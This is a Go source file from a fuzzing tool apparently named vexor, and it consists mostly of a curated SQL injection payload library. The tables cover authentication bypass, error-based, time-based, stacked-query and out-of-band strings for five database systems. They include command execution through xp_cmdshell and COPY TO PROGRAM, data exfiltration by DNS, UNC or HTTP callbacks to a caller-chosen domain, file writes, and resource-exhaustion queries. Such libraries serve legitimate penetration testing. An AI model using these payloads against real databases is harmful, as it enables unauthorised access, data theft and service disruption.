// Package payloads provides curated payload sets for SQL injection and web
// vulnerability fuzzing:
//
//	import "github.com/0xseif-code/vexor/pkg/payloads"
package payloads

import (
	"strconv"
	"strings"
)

// SQLiCategory classifies a SQL injection payload family.
type SQLiCategory string

const (
	// SQLiAuthBypass is an authentication bypass string (OR-tautology,
	// comment truncation, or special character tricks).
	SQLiAuthBypass SQLiCategory = "auth_bypass"
	// SQLiPolyglot is a payload engineered to fire across multiple DBMS
	// dialects or multiple syntactic contexts at once.
	SQLiPolyglot SQLiCategory = "polyglot"
	// SQLiErrorBased is a per-DBMS expression that raises a visible error
	// and often reflects data inside the error message.
	SQLiErrorBased SQLiCategory = "error"
	// SQLiTimeBased is a per-DBMS expression that introduces a sleep; the
	// {seconds} macro is substituted by the caller.
	SQLiTimeBased SQLiCategory = "time"
	// SQLiStacked is a query-stacking probe that appends additional
	// statements after the original query.
	SQLiStacked SQLiCategory = "stacked"
	// SQLiOOB is an out-of-band channel (typically DNS or HTTP) used to
	// exfiltrate data; the {domain} macro is substituted by the caller.
	SQLiOOB SQLiCategory = "oob"
)

// Canonical DBMS identifiers used by the SQLi payload sets.
const (
	// DBMSGeneric marks payloads that are dialect-agnostic.
	DBMSGeneric = "generic"
	// DBMSMySQL covers MySQL and MariaDB.
	DBMSMySQL = "mysql"
	// DBMSPostgres covers PostgreSQL.
	DBMSPostgres = "postgres"
	// DBMSSQLServer covers Microsoft SQL Server and Sybase.
	DBMSSQLServer = "mssql"
	// DBMSOracle covers Oracle Database.
	DBMSOracle = "oracle"
	// DBMSSQLite covers SQLite.
	DBMSSQLite = "sqlite"
)

// SQLiPayload is one SQLi probe with its classification.
type SQLiPayload struct {
	// Category is the payload family (see SQLiCategory constants).
	Category SQLiCategory
	// DBMS is the canonical dialect name (see DBMS* constants).
	DBMS string
	// Payload may contain {seconds}, {domain} and {orig} placeholders.
	Payload string
	// Description is a short human-readable annotation.
	Description string
}

// Expand substitutes {seconds}, {domain}, and {orig} macros in p.Payload and
// returns the concrete string ready to inject.
func (p SQLiPayload) Expand(seconds int, domain, orig string) string {
	r := strings.NewReplacer(
		"{seconds}", strconv.Itoa(seconds),
		"{domain}", domain,
		"{orig}", orig,
	)
	return r.Replace(p.Payload)
}

// ---- data tables (immutable, populated once) ----

var sqliAuthBypass = []SQLiPayload{
	{SQLiAuthBypass, DBMSGeneric, "' OR 1=1--", "Classic OR 1=1 true condition with dash comment"},
	{SQLiAuthBypass, DBMSMySQL, "' OR 1=1#", "Hash-comment terminator (MySQL/SQLite)"},
	{SQLiAuthBypass, DBMSMySQL, "' OR 1=1-- -", "Dash-dash-space comment (MySQL/PostgreSQL)"},
	{SQLiAuthBypass, DBMSMySQL, "' OR 1=1/*", "Block-comment terminator (MySQL)"},
	{SQLiAuthBypass, DBMSGeneric, "\" OR 1=1--", "Double-quoted OR 1=1"},
	{SQLiAuthBypass, DBMSGeneric, "\" OR \"\"=\"\"", "Always-true double-quote comparison"},
	{SQLiAuthBypass, DBMSGeneric, "' OR ''='", "Always-true single-quote comparison"},
	{SQLiAuthBypass, DBMSGeneric, "' OR '1'='1", "Quote-balanced tautology"},
	{SQLiAuthBypass, DBMSGeneric, "' OR '1'='1' --", "Tautology with trailing comment"},
	{SQLiAuthBypass, DBMSGeneric, "' OR 1=1 LIMIT 1--", "True condition limited to one row"},
	{SQLiAuthBypass, DBMSGeneric, "admin'--", "Comment truncation of password check"},
	{SQLiAuthBypass, DBMSMySQL, "admin'#", "Hash-comment truncation (MySQL/SQLite)"},
	{SQLiAuthBypass, DBMSMySQL, "admin'/*", "Block-comment truncation (MySQL)"},
	{SQLiAuthBypass, DBMSGeneric, "admin' OR '1'='1'--", "Boolean OR expanded for the admin account"},
	{SQLiAuthBypass, DBMSGeneric, "admin') OR ('1'='1", "Parenthesized OR variant"},
	{SQLiAuthBypass, DBMSGeneric, "') OR ('1'='1--", "Close-parenthesis OR variant"},
	{SQLiAuthBypass, DBMSGeneric, "' OR 'a'='a", "String-comparison tautology (LIKE context)"},
	{SQLiAuthBypass, DBMSGeneric, "1' OR '1'='1' OR '1'='1", "Double tautology"},
	{SQLiAuthBypass, DBMSGeneric, "' OR 'x'='x'--", "x=x tautology with comment"},
	{SQLiAuthBypass, DBMSOracle, "'||'1", "Oracle/PostgreSQL double-pipe concatenation"},
	{SQLiAuthBypass, DBMSOracle, "'||'a'='a", "Oracle concatenation tautology"},
	{SQLiAuthBypass, DBMSGeneric, "or 1=1--", "Bare OR without a leading quote"},
	{SQLiAuthBypass, DBMSMySQL, "' OR 1=1--+", "Plus-terminated comment (MySQL URL form)"},
	{SQLiAuthBypass, DBMSGeneric, "' OR 1=1", "Bare OR 1=1 true condition"},
	{SQLiAuthBypass, DBMSGeneric, "%27 OR 1=1--", "URL-encoded single quote"},
	{SQLiAuthBypass, DBMSGeneric, "' OR '1'='1'--%00", "Tautology with null-byte comment"},
	{SQLiAuthBypass, DBMSGeneric, "admin' /**/ OR /**/ '1'='1", "Comment-whitespace obfuscation"},
	{SQLiAuthBypass, DBMSGeneric, "'\\'' OR 1=1--", "Escaped-quote breakout for single-quote filters"},
	{SQLiAuthBypass, DBMSGeneric, "' OR 1=1;--", "Semicolon-prefixed comment"},
	{SQLiAuthBypass, DBMSMySQL, "admin' OR '1'='1'#", "Comment OR for admin (MySQL)"},
	{SQLiAuthBypass, DBMSGeneric, "'' OR '1'='1'--", "Empty-string prefix tautology"},
	{SQLiAuthBypass, DBMSGeneric, "' or '1'='1'--", "Lowercase tautology (WAF case filter)"},
	{SQLiAuthBypass, DBMSGeneric, "%00' OR 1=1--", "Null-byte prefix truncation"},
	{SQLiAuthBypass, DBMSGeneric, "admin' --", "Comment truncation with spaced comment"},
	{SQLiAuthBypass, DBMSGeneric, "1' OR '1'='1", "Digit prefix OR true condition"},
}

var sqliPolyglots = []SQLiPayload{
	{SQLiPolyglot, DBMSGeneric, "' OR 1=1--", "Portable OR 1=1: MySQL, MSSQL, SQLite; PG needs trailing space"},
	{SQLiPolyglot, DBMSGeneric, "' OR 1=1-- -", "Dash-dash-space: MySQL, PostgreSQL, MSSQL, SQLite"},
	{SQLiPolyglot, DBMSGeneric, "' OR 1=1#", "Hash comment: MySQL and SQLite"},
	{SQLiPolyglot, DBMSGeneric, "1' OR '1'='1' /*", "Boolean tautology + block comment: MySQL and SQLite"},
	{SQLiPolyglot, DBMSGeneric, "' OR '1'='1'--'", "Self-closing quote tail"},
	{SQLiPolyglot, DBMSGeneric, "' OR '1'='1'#'", "Self-closing quote tail (hash)"},
	{SQLiPolyglot, DBMSGeneric, "'' OR 1=1--", "Empty-string prefix OR"},
	{SQLiPolyglot, DBMSGeneric, "x' OR 1=1 AND '%'='", "LIKE-context tautology"},
	{SQLiPolyglot, DBMSGeneric, "x' AND 1=1 AND '%'='", "LIKE-context true condition"},
	{SQLiPolyglot, DBMSGeneric, "' AND '1' LIKE '1", "LIKE-based tautology"},
	{SQLiPolyglot, DBMSGeneric, "1 OR 1=1", "Unquoted numeric OR"},
	{SQLiPolyglot, DBMSGeneric, "1/**/OR/**/1=1", "Comment whitespace (WAF bypass)"},
	{SQLiPolyglot, DBMSPostgres, "'||'1'='1", "Double-pipe operator tautology (Oracle/PostgreSQL)"},
	{SQLiPolyglot, DBMSGeneric, "\" OR 1=1--' /*", "Dual dialect: double-quote OR + comment"},
	{SQLiPolyglot, DBMSGeneric, "*/' OR 1=1--", "Juggernaut: closes a prior comment then ORs"},
	{SQLiPolyglot, DBMSGeneric, "' OR 1=1 LIMIT 1--", "Inline LIMIT tautology"},
	{SQLiPolyglot, DBMSGeneric, "' OR 1=1 -- ", "Space-padded portable comment"},
	{SQLiPolyglot, DBMSGeneric, "' UNION SELECT 1,2,3-- -", "UNION reflection across DBMSes (column count varies)"},
	{SQLiPolyglot, DBMSGeneric, "'\" OR '1'='1", "Mixed quote toggle"},
	{SQLiPolyglot, DBMSGeneric, "' OR '1'='1' /*", "Tautology + open block comment for traversal"},
	{SQLiPolyglot, DBMSGeneric, "%' OR '1'='1", "LIKE wildcard-prefixed OR"},
}

var sqliErrorBased = []SQLiPayload{
	{SQLiErrorBased, DBMSMySQL, "' AND extractvalue(1,concat(0x7e,version()))-- -", "MySQL XPATH syntax error echoes version()"},
	{SQLiErrorBased, DBMSMySQL, "' AND updatexml(1,concat(0x7e,version()),1)-- -", "MySQL updatexml error reflection"},
	{SQLiErrorBased, DBMSMySQL, "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),0x7e)-- -", "MySQL GTID_SUBSET error"},
	{SQLiErrorBased, DBMSMySQL, "' AND exp(~(SELECT * FROM (SELECT version()) x))-- -", "MySQL double-precision overflow error"},
	{SQLiErrorBased, DBMSMySQL, "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -", "MySQL duplicate-key floor() error"},
	{SQLiErrorBased, DBMSMySQL, "' AND name_const(version(),1)-- -", "MySQL name_const duplicate error"},
	{SQLiErrorBased, DBMSMySQL, "' AND ST_LatFromGeoHash(version())-- -", "MySQL 5.7+ spatial function error"},
	{SQLiErrorBased, DBMSPostgres, "' AND 1=CAST(version() AS int)-- -", "PostgreSQL invalid-cast error"},
	{SQLiErrorBased, DBMSPostgres, "' AND 1=CAST(chr(126)||(SELECT current_user)||chr(126) AS numeric)-- -", "PostgreSQL error wraps data in ~"},
	{SQLiErrorBased, DBMSPostgres, "' AND (SELECT 1/(SELECT 0))-- -", "PostgreSQL divide-by-zero error"},
	{SQLiErrorBased, DBMSPostgres, "' AND 1=(SELECT 0/0 WHERE TRUE)-- -", "PostgreSQL guarded divide-by-zero"},
	{SQLiErrorBased, DBMSPostgres, "' AND (SELECT 1 FROM (SELECT version()) t WHERE 1/0=1)-- -", "PostgreSQL divide-by-zero via correlated query"},
	{SQLiErrorBased, DBMSPostgres, "' AND 1::int=version()-- -", "PostgreSQL hard cast syntax error"},
	{SQLiErrorBased, DBMSSQLServer, "' AND 1=CONVERT(int,@@version)--", "MSSQL conversion error echoes version"},
	{SQLiErrorBased, DBMSSQLServer, "' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL nested conversion error"},
	{SQLiErrorBased, DBMSSQLServer, "' AND 1=CONVERT(int,user)--", "MSSQL conversion error echoes user"},
	{SQLiErrorBased, DBMSSQLServer, "' HAVING 1=1--", "MSSQL HAVING column mismatch error"},
	{SQLiErrorBased, DBMSSQLServer, "' AND 1=CONVERT(int,db_name())--", "MSSQL conversion error echoes database name"},
	{SQLiErrorBased, DBMSSQLServer, "' AND 1=(SELECT TOP 1 1/0 FROM sys.objects)--", "MSSQL divide-by-zero error"},
	{SQLiErrorBased, DBMSSQLServer, "' AND 1=1/0--", "MSSQL literal divide-by-zero"},
	{SQLiErrorBased, DBMSOracle, "' AND 1=UTL_INADDR.GET_HOST_NAME('x')--", "Oracle ORA-06502 invalid name"},
	{SQLiErrorBased, DBMSOracle, "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--", "Oracle CONCHR context error"},
	{SQLiErrorBased, DBMSOracle, "' AND 1=XMLType(CHR(39)||(SELECT user FROM dual)||CHR(39))--", "Oracle ORA-00932 data-type mismatch"},
	{SQLiErrorBased, DBMSOracle, "' AND 1=TO_NUMBER((SELECT user FROM dual))--", "Oracle ORA-01722 invalid number"},
	{SQLiErrorBased, DBMSOracle, "' AND 1=1/0--", "Oracle ORA-01476 divisor is equal to zero"},
	{SQLiErrorBased, DBMSSQLite, "' AND (SELECT load_extension('/tmp/vexor.so'))--", "SQLite extension load (errors unless module exists)"},
	{SQLiErrorBased, DBMSSQLite, "' AND randomblob(1073741824)--", "SQLite large BLOB allocation (memory pressure)"},
	{SQLiErrorBased, DBMSSQLite, "' AND abs(-9223372036854775808)--", "SQLite integer overflow in abs()"},
	{SQLiErrorBased, DBMSSQLite, "' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d)--", "SQLite heavy cross-join (resource exhaustion)"},
}

var sqliTimeBased = []SQLiPayload{
	{SQLiTimeBased, DBMSMySQL, "' AND SLEEP({seconds})-- -", "MySQL SLEEP()"},
	{SQLiTimeBased, DBMSMySQL, "' AND BENCHMARK(10000000,SHA1('v'))-- -", "MySQL CPU-bound BENCHMARK delay (uses fixed workload)"},
	{SQLiTimeBased, DBMSMySQL, "' AND IF(1=1,SLEEP({seconds}),0)-- -", "MySQL conditional SLEEP"},
	{SQLiTimeBased, DBMSMySQL, "' AND (SELECT * FROM (SELECT SLEEP({seconds})) a)-- -", "MySQL derived-table SLEEP"},
	{SQLiTimeBased, DBMSMySQL, "' OR SLEEP({seconds})-- -", "MySQL OR-context SLEEP"},
	{SQLiTimeBased, DBMSMySQL, "' AND SLEEP({seconds}) AND '1'='1", "MySQL quote-balanced SLEEP"},
	{SQLiTimeBased, DBMSPostgres, "' AND pg_sleep({seconds})-- -", "PostgreSQL pg_sleep()"},
	{SQLiTimeBased, DBMSPostgres, "'; SELECT pg_sleep({seconds});--", "PostgreSQL stacked pg_sleep"},
	{SQLiTimeBased, DBMSPostgres, "' AND (SELECT 1 FROM pg_sleep({seconds}))-- -", "PostgreSQL pg_sleep nested in SELECT"},
	{SQLiTimeBased, DBMSPostgres, "' AND CASE WHEN 1=1 THEN pg_sleep({seconds}) ELSE 0 END-- -", "PostgreSQL conditional pg_sleep"},
	{SQLiTimeBased, DBMSPostgres, "' AND (SELECT count(*) FROM generate_series(1,{seconds}*1000000))-- -", "PostgreSQL CPU delay via generate_series"},
	{SQLiTimeBased, DBMSSQLServer, "'; WAITFOR DELAY '0:0:{seconds}';--", "MSSQL WAITFOR stacked"},
	{SQLiTimeBased, DBMSSQLServer, "' AND 1=1; WAITFOR DELAY '0:0:{seconds}';--", "MSSQL WAITFOR after true condition"},
	{SQLiTimeBased, DBMSSQLServer, "'; IF 1=1 WAITFOR DELAY '0:0:{seconds}'--", "MSSQL conditional WAITFOR"},
	{SQLiTimeBased, DBMSSQLServer, "' AND (SELECT COUNT(*) FROM sysusers a, sysusers b, sysusers c, sysusers d, sysusers e)--", "MSSQL cross-join resource delay"},
	{SQLiTimeBased, DBMSSQLServer, "'; WAITFOR DELAY '0:0:{seconds}'; SELECT 1;--", "MSSQL WAITFOR with trailing statement"},
	{SQLiTimeBased, DBMSOracle, "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds})--", "Oracle DBMS_PIPE sleep"},
	{SQLiTimeBased, DBMSOracle, "' AND 1=DBMS_LOCK.SLEEP({seconds})--", "Oracle DBMS_LOCK sleep (privileged)"},
	{SQLiTimeBased, DBMSOracle, "' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b, all_objects c)--", "Oracle catalog cross-join delay"},
	{SQLiTimeBased, DBMSOracle, "' AND 1=UTL_INADDR.get_host_address('10.0.0.{seconds}') IS NOT NULL--", "Oracle DNS-based timing (unresolvable address)"},
	{SQLiTimeBased, DBMSSQLite, "' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d, sqlite_master e)--", "SQLite cross-join delay"},
	{SQLiTimeBased, DBMSSQLite, "' AND (SELECT randomblob({seconds}*100000000))--", "SQLite large randomblob allocation"},
	{SQLiTimeBased, DBMSSQLite, "' AND (SELECT COUNT(*) FROM pragma_table_list() a, pragma_table_list() b)--", "SQLite pragma cross-join (4.x)"},
	{SQLiTimeBased, DBMSGeneric, "' OR 'a'='a' AND SLEEP({seconds})-- -", "Generic MySQL-family tautology delay"},
}

var sqliStacked = []SQLiPayload{
	{SQLiStacked, DBMSGeneric, "'; SELECT 1;--", "Basic stacked SELECT"},
	{SQLiStacked, DBMSGeneric, "1; SELECT 1;--", "Numeric-context stacked SELECT"},
	{SQLiStacked, DBMSGeneric, "' OR 1=1; SELECT 1;--", "Tautology + stacked SELECT"},
	{SQLiStacked, DBMSGeneric, "; SELECT 1;--", "Bare-semicolon stacked SELECT"},
	{SQLiStacked, DBMSGeneric, "';SELECT 1;SELECT 2;--", "Multiple stacked statements"},
	{SQLiStacked, DBMSPostgres, "'; SELECT current_user;--", "PostgreSQL user disclosure"},
	{SQLiStacked, DBMSPostgres, "'; SELECT version();--", "PostgreSQL version disclosure"},
	{SQLiStacked, DBMSPostgres, "1'; SELECT pg_sleep(5);--", "PostgreSQL stacked time delay"},
	{SQLiStacked, DBMSSQLServer, "'; WAITFOR DELAY '0:0:5';--", "MSSQL stacked delay"},
	{SQLiStacked, DBMSSQLServer, "'; EXEC sp_help;--", "MSSQL sp_help stored-procedure call"},
	{SQLiStacked, DBMSSQLServer, "'; EXEC master.dbo.xp_cmdshell 'whoami';--", "MSSQL command execution via xp_cmdshell"},
	{SQLiStacked, DBMSSQLServer, "'; USE master; SELECT 1;--", "MSSQL database switch probe"},
	{SQLiStacked, DBMSSQLServer, "'; SELECT @@version;--", "MSSQL stacked version disclosure"},
	{SQLiStacked, DBMSSQLServer, "'; EXEC master.dbo.xp_cmdshell 'ping -n 5 127.0.0.1';--", "MSSQL command delay via xp_cmdshell"},
	{SQLiStacked, DBMSPostgres, "'; COPY (SELECT '') TO PROGRAM 'sleep 5';--", "PostgreSQL server-side shell via COPY (superuser)"},
	{SQLiStacked, DBMSMySQL, "'; CALL SLEEP(5);--", "MySQL CALL SLEEP (requires stacked execution)"},
	{SQLiStacked, DBMSMySQL, "'; SELECT 'v' INTO OUTFILE '/tmp/vexor.out';--", "MySQL file write probe (FILE privilege)"},
	{SQLiStacked, DBMSGeneric, "' AND 1=1; SELECT 1;--", "True condition + stacked SELECT"},
	{SQLiStacked, DBMSPostgres, "'; SELECT pg_sleep(5); SELECT 1;--", "PostgreSQL multi-statement delay"},
	{SQLiStacked, DBMSGeneric, "' UNION ALL SELECT NULL,NULL,NULL;--", "UNION ALL probe for three columns"},
}

var sqliOOB = []SQLiPayload{
	{SQLiOOB, DBMSMySQL, "' AND LOAD_FILE(CONCAT('\\\\', '{domain}', '\\a'))-- -", "MySQL LOAD_FILE UNC DNS callback"},
	{SQLiOOB, DBMSMySQL, "' AND (SELECT LOAD_FILE('\\\\{domain}\\a'))-- -", "MySQL LOAD_FILE single-string UNC"},
	{SQLiOOB, DBMSMySQL, "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT LOAD_FILE('\\\\{domain}\\a'))))-- -", "MySQL LOAD_FILE via extractvalue context"},
	{SQLiOOB, DBMSMySQL, "' INTO OUTFILE '\\\\{domain}\\a'-- -", "MySQL OUTFILE UNC write (FILE privilege)"},
	{SQLiOOB, DBMSMySQL, "' UNION SELECT LOAD_FILE('\\\\{domain}\\d')-- -", "MySQL UNION LOAD_FILE DNS"},
	{SQLiOOB, DBMSPostgres, "1; COPY (SELECT '') TO PROGRAM 'nslookup {domain}';--", "PostgreSQL COPY TO PROGRAM DNS (superuser)"},
	{SQLiOOB, DBMSPostgres, "1; SELECT 1 FROM pg_ls_dir('\\\\{domain}\\a');--", "PostgreSQL pg_ls_dir UNC probe"},
	{SQLiOOB, DBMSPostgres, "1; CREATE TABLE vextmp(t text); COPY vextmp FROM '\\\\{domain}\\a';--", "PostgreSQL COPY FROM UNC callback"},
	{SQLiOOB, DBMSPostgres, "1; SELECT dblink_connect('host={domain} dbname=x user=y');--", "PostgreSQL dblink outbound connect (extension)"},
	{SQLiOOB, DBMSOracle, "' AND UTL_INADDR.GET_HOST_ADDRESS('{domain}') IS NOT NULL--", "Oracle reverse-DNS callback"},
	{SQLiOOB, DBMSOracle, "' AND SYS.DBMS_LDAP.INIT(('{domain}'),80) IS NOT NULL--", "Oracle LDAP outbound connect"},
	{SQLiOOB, DBMSOracle, "' AND UTL_HTTP.REQUEST('http://{domain}/probe') IS NOT NULL--", "Oracle HTTP outbound request"},
	{SQLiOOB, DBMSOracle, "' AND HTTPURITYPE('http://{domain}/probe').GETCLOB() IS NOT NULL--", "Oracle HTTPURITYPE outbound fetch"},
	{SQLiOOB, DBMSSQLServer, "'; EXEC master.dbo.xp_dirtree '\\\\{domain}\\a';--", "MSSQL xp_dirtree UNC callback"},
	{SQLiOOB, DBMSSQLServer, "'; EXEC master.dbo.xp_fileexist '\\\\{domain}\\a';--", "MSSQL xp_fileexist UNC callback"},
	{SQLiOOB, DBMSSQLServer, "'; DECLARE @d varchar(200); SET @d='\\\\{domain}\\'+(SELECT user); EXEC master.dbo.xp_dirtree @d;--", "MSSQL xp_dirtree with data-encoded host"},
	{SQLiOOB, DBMSSQLServer, "'; EXEC master..xp_subdirs '\\\\{domain}\\a';--", "MSSQL xp_subdirs UNC callback"},
	{SQLiOOB, DBMSSQLServer, "'; EXEC master.dbo.xp_cmdshell 'nslookup {domain}';--", "MSSQL command DNS exfil"},
	{SQLiOOB, DBMSSQLite, "' AND load_extension('\\\\{domain}\\x')--", "SQLite load_extension UNC (Windows client)"},
	{SQLiOOB, DBMSSQLite, "' AND (SELECT CASE WHEN load_extension('\\\\{domain}\\x') THEN 1 ELSE 0 END)--", "SQLite conditional load_extension UNC"},
}

// sqliRegistry orders payload groups for stable iteration.
var sqliRegistry = []struct {
	Category SQLiCategory
	Set      []SQLiPayload
}{
	{SQLiAuthBypass, sqliAuthBypass},
	{SQLiPolyglot, sqliPolyglots},
	{SQLiErrorBased, sqliErrorBased},
	{SQLiTimeBased, sqliTimeBased},
	{SQLiStacked, sqliStacked},
	{SQLiOOB, sqliOOB},
}

// NormalizeDBMS maps dialect synonyms onto the canonical DBMS* constants.
// Unknown or empty names resolve to DBMSGeneric.
func NormalizeDBMS(name string) string {
	switch strings.ToLower(strings.TrimSpace(name)) {
	case "mysql", "mariadb":
		return DBMSMySQL
	case "postgres", "postgresql", "pgsql", "redshift":
		return DBMSPostgres
	case "mssql", "sqlserver", "sql server", "sybase", "sap":
		return DBMSSQLServer
	case "oracle", "oracledb":
		return DBMSOracle
	case "sqlite", "sqlite3":
		return DBMSSQLite
	default:
		return DBMSGeneric
	}
}

// SQLiCategories returns the supported category names in canonical order.
func SQLiCategories() []SQLiCategory {
	return []SQLiCategory{
		SQLiAuthBypass, SQLiPolyglot, SQLiErrorBased, SQLiTimeBased, SQLiStacked, SQLiOOB,
	}
}

// DBMSNames returns the canonical DBMS identifiers accepted as filters.
func DBMSNames() []string {
	return []string{DBMSGeneric, DBMSMySQL, DBMSPostgres, DBMSSQLServer, DBMSOracle, DBMSSQLite}
}

// GetSQLiPayloads returns defensive copies of the payloads matching the
// category and DBMS filters. An empty category or DBMS acts as a wildcard.
// DBMS names are normalized, so "mariadb" matches MySQL payloads.
func GetSQLiPayloads(cat SQLiCategory, dbms string) []SQLiPayload {
	if dbms != "" {
		dbms = NormalizeDBMS(dbms)
	}
	out := make([]SQLiPayload, 0, 64)
	for _, group := range sqliRegistry {
		if cat != "" && group.Category != cat {
			continue
		}
		for _, p := range group.Set {
			if dbms != "" && p.DBMS != dbms {
				continue
			}
			out = append(out, p)
		}
	}
	return out
}

// GetSQLiPayloadsByCategory returns defensive copies of every payload in one
// category, regardless of DBMS.
func GetSQLiPayloadsByCategory(cat SQLiCategory) []SQLiPayload {
	for _, group := range sqliRegistry {
		if group.Category != cat {
			continue
		}
		out := make([]SQLiPayload, len(group.Set))
		copy(out, group.Set)
		return out
	}
	return []SQLiPayload{}
}

// GetAllSQLiPayloads returns defensive copies of the entire curated library.
func GetAllSQLiPayloads() []SQLiPayload {
	var total int
	for _, group := range sqliRegistry {
		total += len(group.Set)
	}
	out := make([]SQLiPayload, 0, total)
	for _, group := range sqliRegistry {
		out = append(out, group.Set...)
	}
	return out
}

// payloadStrings flattens a payload group into its raw payload strings.
func payloadStrings(set []SQLiPayload) []string {
	out := make([]string, 0, len(set))
	for _, p := range set {
		out = append(out, p.Payload)
	}
	return out
}

// GetAuthBypassPayloads returns the authentication-bypass payload strings.
func GetAuthBypassPayloads() []string {
	return payloadStrings(sqliAuthBypass)
}

// GetPolyglots returns the multi-dialect polyglot payload strings.
func GetPolyglots() []string {
	return payloadStrings(sqliPolyglots)
}

// GetErrorBasedPayloads returns the per-DBMS error-trigger strings.
func GetErrorBasedPayloads() []string {
	return payloadStrings(sqliErrorBased)
}

// GetTimeBasedPayloads returns the time-delay template strings (expand
// {seconds} before use).
func GetTimeBasedPayloads() []string {
	return payloadStrings(sqliTimeBased)
}

// GetStackedPayloads returns the query-stacking probe strings.
func GetStackedPayloads() []string {
	return payloadStrings(sqliStacked)
}

// GetOOBPayloads returns the out-of-band exfiltration templates (expand
// {domain} before use).
func GetOOBPayloads() []string {
	return payloadStrings(sqliOOB)
}
